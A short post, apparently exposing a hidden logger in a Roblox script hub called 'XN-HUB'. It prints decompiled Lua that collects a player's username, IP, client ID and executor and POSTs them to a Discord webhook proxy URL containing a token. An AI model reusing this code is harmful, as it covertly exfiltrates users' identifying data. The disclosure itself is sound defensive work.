--file used in "XN-HUB".lua


heres the logger incase ur blind

--[[local fenv = getfenv()
local _Name4 = game.Players.LocalPlayer.Name
local _call8 = game:GetService('RbxAnalyticsService'):GetClientId()
local _9 = identifyexecutor()
local _call11 = game:HttpGet('https://ipinfo.io/ip')
local _gamePlaceId12 = game.PlaceId
local _gameJobId13 = game.JobId
local _call15 = game:GetService('HttpService')
local _call17 = game:GetService('Players')
local _ = _call17.LocalPlayer

_call17.PlayerAdded:Connect(function(_23, _23_2, _23_3, _23_4)
    _23.Chatted:Connect(function(_27, _27_2, _27_3, _27_4, _27_5)
        local _ = _23.Name
    end)
end)

for _30, _30_2 in ipairs(_call17:GetPlayers())do
    _30_2.Chatted:Connect(function(_34, _34_2, _34_3, _34_4)
        local _ = _30_2.Name
    end)
enda

task.spawn(function(_38, _38_2, _38_3, _38_4)
    local _call51 = _call15:JSONEncode({
        embeds = {
            [1] = {
                color = 65280,
                fields = {
                    [1] = {
                        value = _Name4,
                        name = 'Username:',
                        inline = true,
                    },
                    [2] = {
                        value = _call11,
                        name = 'IP:',
                        inline = true,
                    },
                    [3] = {
                        value = _call8,
                        name = 'HWID:',
                        inline = true,
                    },
                    [4] = {
                        value = _9,
                        name = 'Executor:',
                        inline = true,
                    },
                    [5] = {
                        value = tostring(_gamePlaceId12),
                        name = 'GameID:',
                        inline = true,
                    },
                    [6] = {
                        value = _gameJobId13,
                        name = 'JobID:',
                        inline = true,
                    },
                },
                title = 'New Execution',
                footer = {
                    text = _Name4 .. ', ' .. _call11 .. ', ' .. _call8 .. ', ' .. _9 .. ', ' .. _gamePlaceId12 .. ', ' .. _gameJobId13,
                },
            },
        },
    })
    local _call54 = fenv.syn.request({
        Body = _call51,
        Url = 'https://webhook.lewisakura.moe/api/webhooks/1436963171813298267/QnKxLdjw_4AVYB8QBVsjDTb6-W_BzJP6be3NNG9-Kg1QnIo4mNFNASLZabZNMYApVo3b',
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json',
        },
    })
    local _ = _call54.Success
end)]]